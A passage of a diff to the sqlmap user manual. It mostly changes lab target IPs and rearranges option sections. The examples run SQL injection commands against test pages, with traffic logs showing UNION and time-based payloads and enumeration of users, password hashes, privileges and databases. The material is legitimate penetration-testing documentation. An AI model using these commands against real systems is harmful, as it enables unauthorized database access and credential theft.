 own Cookie within the HTTP Set-Cookie header. Do you want to continue using the HTTP cookie
 values that you provided? [Y/n] 
 </verb></tscreen>
 
-
-<sect2>URL Encode generated cookie injections
-
 <p>
-Option: <tt>-</tt><tt>-cookie-urlencode</tt>
-
-sqlmap by default doesn't URL Encode generated cookie injections, but you can force it by 
-using this flag. Cookie content encoding is not declared by standard in any way, so it's 
-solely the matter of web application's behaviour.
-
-
-<sect2>Ignore <tt>Set-Cookie</tt> header from response
-
-<p>
-Option: <tt>-</tt><tt>-drop-set-cookie</tt>
-
-Sometimes there is a need for ignoring any session cookie(s) returned by web server and/or
-usage of only the custom supplied value (see option <tt>-</tt><tt>-cookie</tt>). In such cases
-option <tt>-</tt><tt>-drop-set-cookie</tt> should be used.
+sqlmap by default doesn't URL encode generated cookie injections, but you can force it by 
+using the <tt>-</tt><tt>-cookie-urlencode</tt> flag. Cookie content encoding is not declared
+by standard in any way, so it's solely the matter of web application's behaviour.
 
 
 <sect2>HTTP <tt>User-Agent</tt> header
@@ -1260,7 +1229,7 @@ It is possible to fake it with the <tt>-</tt><tt>-user-agent</tt> option.
 Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" \
   --user-agent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" -v 3
 
 [...]
@@ -1268,7 +1237,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" \
 [hh:mm:02] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
@@ -1287,7 +1256,7 @@ and use it for all HTTP requests.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 1 \
   -a "./txt/user-agents.txt"
 
 [hh:mm:00] [DEBUG] initializing the configuration
@@ -1303,7 +1272,7 @@ Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)
 [hh:mm:00] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
@@ -1344,7 +1313,7 @@ requests.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --referer \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --referer \
   "http://www.google.com" -v 3
 
 [...]
@@ -1352,7 +1321,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --ref
 [hh:mm:48] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
 Referer: http://www.google.com
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
@@ -1375,23 +1344,23 @@ to provide them from the configuration INI file. Have a look at the sample
 <tt>sqlmap.conf</tt> file.
 
 
-<sect2>HTTP <tt>Basic</tt>, <tt>Digest</tt> and <tt>NTLM</tt> authentications
+<sect2>HTTPs <tt>Basic</tt>, <tt>Digest</tt> and <tt>NTLM</tt> authentications
 
 <p>
 Options: <tt>-</tt><tt>-auth-type</tt> and <tt>-</tt><tt>-auth-cred</tt>
 
 <p>
 These options can be used to specify which HTTP authentication type the
-web server implements and the valid credentials to be used 
-to perfom all HTTP requests to the target URL.
-The three valid types are <tt>Basic</tt>, <tt>Digest</tt> and <tt>NTLM</tt>, while the
-credentials' syntax is <tt>username:password</tt>.
+web server implements and the valid credentials to be used to perfom all
+HTTP requests to the target application.
+The three valid types are <tt>Basic</tt>, <tt>Digest</tt> and <tt>NTLM</tt>,
+while the credentials' syntax is <tt>username:password</tt>.
 
 <p>
 Examples on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/basic/get_int.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/basic/get_int.php?id=1" \
   --auth-type Basic --auth-cred "testuser:testpass" -v 3
 
 [...]
@@ -1399,7 +1368,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/basic/get_int.php?id=1"
 [hh:mm:14] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/basic/get_int.php?id=1 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
@@ -1409,7 +1378,7 @@ Connection: close
 [...]
 
 
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/digest/get_int.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/digest/get_int.php?id=1" \
   --auth-type Digest --auth-cred "testuser:testpass" -v 3
 
 [...]
@@ -1417,7 +1386,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/digest/get_int.php?id=1
 [hh:mm:54] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/digest/get_int.php?id=1 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
@@ -1431,7 +1400,7 @@ Connection: close
 </verb></tscreen>
 
 
-<sect2>HTTPs authentication with certificate
+<sect2>HTTPs Certificate authentication
 
 <p>
 Option: <tt>-</tt><tt>-auth-cert</tt>
@@ -1466,8 +1435,8 @@ HTTP requests to the target URL. The syntax of HTTP proxy value is
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" \
-  --proxy "http://192.168.1.47:3128"
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" \
+  --proxy "http://172.16.213.1:8080"
 
 [hh:mm:36] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
 [hh:mm:36] [WARNING] GET parameter 'cat' is not dynamic
@@ -1484,13 +1453,23 @@ as explained on the <htmlurl url="http://tor.eff.org/docs/tor-doc-unix.html.en"
 name="Tor client guide"> then run sqlmap as follows:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" \
-  --proxy "http://192.168.1.47:8118"
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" \
+  --proxy "http://172.16.213.1:8118"
 </verb></tscreen>
 
 <p>
 Note that <tt>8118</tt> is the default Privoxy port, adapt it to your
 settings.
+
+
+<sect2>Ignoring system default HTTP proxy
+
+<p>
+Option: <tt>-</tt><tt>-ignore-proxy</tt>
+
+This option should be used in cases like when you want to run sqlmap
+against the machine inside a local area network skipping default
+usage of a system-wide set HTTP proxy server.
 
 
 <sect2>Concurrent HTTP requests
@@ -1509,7 +1488,7 @@ name="multithreading"> concept and inherits both its pro and its cons.
 Examples on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 1 \
   --current-user --threads 3
 
 [...]
@@ -1579,16 +1558,6 @@ Option: <tt>-</tt><tt>-scope</tt>
 #TODO
 
 
-<sect2>Ignoring system default HTTP proxy
-
-<p>
-Option: <tt>-</tt><tt>-ignore-proxy</tt>
-
-This option should be used in cases like when you want to run sqlmap
-against the machine inside a local area network skipping default
-usage of a system wide set HTTP proxy server.
-
-
 <sect1>Injection
 
 <p>
@@ -1612,7 +1581,7 @@ injection test and inject directly only against the provided parameter(s).
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 1 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -v 1 \
   -p "id"
 
 [hh:mm:48] [INFO] testing connection to the target url
@@ -1634,7 +1603,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 1 
 Or, if you want to provide more than one parameter, for instance:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&amp;cat=2" -v 1 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1&amp;cat=2" -v 1 \
   -p "cat,id"
 </verb></tscreen>
 
@@ -1645,7 +1614,7 @@ You can also test only the HTTP <tt>User-Agent</tt> header.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/ua_str.php" -v 1 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/ua_str.php" -v 1 \
   -p "user-agent" --user-agent "sqlmap/0.8 (http://sqlmap.sourceforge.net)"
 
 [hh:mm:40] [WARNING] the testable parameter 'user-agent' you provided is not into the GET
@@ -1709,7 +1678,7 @@ Microsoft SQL Server.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 2 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -v 2 \
   --dbms "PostgreSQL"
 
 [...]
@@ -1777,7 +1746,7 @@ Example on a <bf>MySQL 5.0.67</bf> target on a page where the SQL query is:
 <tt>$query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";</tt>:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_str_brackets.php?id=1" -v 3 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_str_brackets.php?id=1" -v 3 \
   -p "id" --prefix "'" --postfix "AND 'test'='test"
 
 [...]
@@ -1787,7 +1756,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_str_brackets.php?id
 GET /sqlmap/mysql/get_str_brackets.php?id=1%27%29%20AND%207433=7433%20AND%20
 %28%27test%27=%27test HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
@@ -1855,14 +1824,14 @@ Example on a <bf>MySQL 5.0.67</bf> target on a page which content changes
 every second due to a call to PHP function <tt>time()</tt>:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int_refresh.php?id=1" \
   -v 5
 
 [...]
 [hh:mm:50] [INFO] testing if the url is stable, wait a few seconds
 [hh:mm:50] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
@@ -1884,7 +1853,7 @@ Content-Type: text/html
 
 [hh:mm:51] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
@@ -1906,7 +1875,7 @@ Content-Type: text/html
 
 [hh:mm:51] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
@@ -1949,7 +1918,7 @@ Example on a <bf>MySQL 5.0.67</bf> target on a page which content changes
 every second due to a call to PHP function <tt>time()</tt>:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int_refresh.php?id=1" \
   --string "luther" -v 1
 
 [hh:mm:22] [INFO] testing connection to the target url
@@ -1976,7 +1945,7 @@ Example on a <bf>MySQL 5.0.67</bf> target on a page which content changes
 every second due to a call to PHP function <tt>time()</tt>:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int_refresh.php?id=1" \
   --regexp "<td>lu[\w][\w]er" -v 1
 
 [hh:mm:22] [INFO] testing connection to the target url
@@ -2023,7 +1992,7 @@ dynamic text from the page before processing it and comparing it with the
 not injected page.
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int_refresh.php?id=1" \
   --excl-reg "Dynamic content: ([\d]+)"
 
 [hh:mm:22] [INFO] testing connection to the target url
@@ -2062,7 +2031,7 @@ parameter.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" \
   --stacked-test -v 1
 
 [...]
@@ -2085,7 +2054,7 @@ where PHP does not support them on MySQL, it does on PostgreSQL.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" \
   --stacked-test -v 1
 
 [...]
@@ -2125,7 +2094,7 @@ blind SQL injection</bf> vulnerability.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" \
   --time-test -v 1
 
 [...]
@@ -2142,7 +2111,7 @@ time based blind sql injection payload:    'id=1 AND SLEEP(5) AND 5249=5249'
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" \
   --time-test -v 1
 
 [...]
@@ -2202,7 +2171,7 @@ technique.
 Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" \
   --union-test -v 1
 
 [...]
@@ -2211,7 +2180,7 @@ back-end DBMS:  Oracle
 [hh:mm:27] [INFO] testing inband sql injection on parameter 'id' with NULL bruteforcing 
 technique
 [hh:mm:27] [INFO] the target url could be affected by an inband sql injection vulnerability
-valid union:    'http://192.168.1.121:80/sqlmap/oracle/get_int.php?id=1 UNION ALL SELECT 
+valid union:    'http://172.16.213.131/sqlmap/oracle/get_int.php?id=1 UNION ALL SELECT 
 NULL, NULL, NULL FROM DUAL-- AND 6558=6558'
 </verb></tscreen>
 
@@ -2229,7 +2198,7 @@ url="http://bernardodamele.blogspot.com/2007/07/insight-on-union-query-sql-injec
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_str.php?id=1" \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_str.php?id=1" \
   --union-test --union-tech orderby -v 1
 
 [...]
@@ -2280,7 +2249,7 @@ ahead.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" -v 1 \
   --union-use --banner
 
 [...]
@@ -2315,7 +2284,7 @@ vulnerabilities.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 5 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 5 \
   --union-use --current-user
 
 [...]
@@ -2330,7 +2299,7 @@ GET /sqlmap/mysql/get_int.php?id=1%20UNION%20ALL%20SELECT%20NULL%2C%20CONCAT%28C
 %29%2C%20CHAR%2832%29%29%2CCHAR%2872%2C89%2C75%2C77%2C121%2C103%29%29%2C%20NULL%23%20AND
 %208032=8032 HTTP/1.1
 Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
+Host: 172.16.213.131
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
@@ -2373,7 +2342,7 @@ entry is displayed in the page content.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_partialunion.php?id=1" -v 1 \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int_partialunion.php?id=1" -v 1 \
   --union-use --dbs
 
 [...]
@@ -2451,7 +2420,7 @@ specific syntax within the limits of the database architecture.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 1
 
 [...]
 [hh:mm:17] [INFO] testing MySQL
@@ -2478,7 +2447,7 @@ messages, you can  provide the <tt>-</tt><tt>-fingerprint</tt> option.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 -f
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 1 -f
 
 [...]
 [hh:mm:49] [INFO] testing MySQL
@@ -2508,7 +2477,7 @@ back-end DBMS: active fingerprint: MySQL >= 5.0.38 and < 5.1.2
 Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" -v 1 -f
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" -v 1 -f
 
 [...]
 [hh:mm:38] [WARNING] the back-end DMBS is not MySQL
@@ -2529,7 +2498,7 @@ back-end DBMS: active fingerprint: Oracle 10g
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 1 -f
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -v 1 -f
 
 [...]
 [hh:mm:14] [WARNING] the back-end DMBS is not Oracle
@@ -2557,7 +2526,7 @@ back-end database management system name with option <tt>-</tt><tt>-dbms</tt>.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 -f
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" -v 1 -f
 
 [...]
 [hh:mm:41] [WARNING] the back-end DMBS is not PostgreSQL
@@ -2595,7 +2564,7 @@ you can also provide the <tt>-b</tt> or <tt>-</tt><tt>-banner</tt> option.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 -f -b
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -v 1 -f -b
 
 [...]
 [hh:mm:04] [INFO] testing MySQL
@@ -2635,7 +2604,7 @@ operating system by parsing the DBMS banner value.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 -f -b
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" -v 1 -f -b
 
 [...]
 [hh:mm:03] [WARNING] the back-end DMBS is not PostgreSQL
@@ -2716,7 +2685,7 @@ environment variable <tt>@@version</tt>.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -b -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" -b -v 0
 
 banner:    '5.0.67-0ubuntu6'
 </verb></tscreen>
@@ -2725,7 +2694,7 @@ banner:    '5.0.67-0ubuntu6'
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" -b -v 0
 
 banner:    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real 
 (Ubuntu 4.3.2-1ubuntu11) 4.3.2'
@@ -2735,7 +2704,7 @@ banner:    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real
 Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" -b -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" -b -v 0
 
 banner:    'Oracle Database 10g Express Edition Release 10.2.0.1.0 - Product'
 </verb></tscreen>
@@ -2744,7 +2713,7 @@ banner:    'Oracle Database 10g Express Edition Release 10.2.0.1.0 - Product'
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -b -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" -b -v 0
 
 banner:
 ---
@@ -2784,7 +2753,7 @@ effectively performing the query on the database from the web application.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --current-user -v 0
+python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --current-user -v 0
 
 current user:    'testuser@localhost'
 </verb></tscreen>
@@ -2803,7 +2772,7 @@ web application is connected to.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --current-db -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --current-db -v 0
 
 current database:    'master'
 </verb></tscreen>
@@ -2822,7 +2791,7 @@ a database administrator.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --is-dba -v 1
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --is-dba -v 1
 
 [...]
 back-end DBMS: PostgreSQL
@@ -2839,7 +2808,7 @@ current user is DBA:    'True'
 Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --is-dba -v 1
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" --is-dba -v 1
 
 [...]
 back-end DBMS: Oracle
@@ -2866,7 +2835,7 @@ It is possible to enumerate the list of database management system users.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --users -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --users -v 0
 
 database management system users [3]:
 [*] postgres
@@ -2888,7 +2857,7 @@ management system user.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --passwords -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --passwords -v 0
 
 [*] debian-sys-maint [1]:
     password hash: *BBDC22D2B1E18C8628D29228649621B32A1B1892
@@ -2906,7 +2875,7 @@ want to enumerate the password hashes.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --passwords \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --passwords \
   -U sa -v 0
 
 database management system users password hashes:
@@ -2931,7 +2900,7 @@ current user and will retrieve the password hashes for this user.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --passwords \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --passwords \
   -U CU -v 1
 
 [...]
@@ -2973,7 +2942,7 @@ system user.
 Example on an <bf>Oracle XE 10.2.0.1</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --privileges -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/oracle/get_int.php?id=1" --privileges -v 0
 
 [hh:mm:25] [WARNING] unable to retrieve the number of privileges for user 'ANONYMOUS'
 [hh:mm:28] [WARNING] unable to retrieve the number of privileges for user 'DIP'
@@ -3041,7 +3010,7 @@ want to enumerate the privileges.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --privileges \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --privileges \
   -U postgres -v 0
 
 database management system users privileges:
@@ -3064,7 +3033,7 @@ current user and will enumerate the privileges for this user.
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --passwords \
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/pgsql/get_int.php?id=1" --passwords \
   -U CU -v 1
 
 [...]
@@ -3123,7 +3092,7 @@ It is possible to enumerate the list of databases.
 Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --dbs -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mssql/get_int.php?id=1" --dbs -v 0
 
 available databases [6]:
 [*] master
@@ -3151,7 +3120,7 @@ management system's databases.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --tables -v 0
+$ python sqlmap.py -u "http://172.16.213.131/sqlmap/mysql/get_int.php?id=1" --tables -v 0
 
 Database: test
 [1 table]
@@ -3212,7 +3181,7 @@ that you want to enumerate the tables.
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
